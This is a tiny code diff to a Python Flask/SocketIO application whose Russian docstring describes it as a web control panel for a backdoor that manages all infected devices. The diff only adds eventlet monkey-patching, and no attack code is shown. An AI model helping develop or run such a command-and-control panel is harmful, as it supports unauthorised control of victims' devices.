@@ -3,6 +3,8 @@
 Веб-панель управления бэкдором
 Бесплатный хостинг и управление всеми зараженными устройствами
 """
+import eventlet
+eventlet.monkey_patch()
 
 from flask import Flask, render_template, request, jsonify, redirect, url_for, session
 from flask_socketio import SocketIO, emit
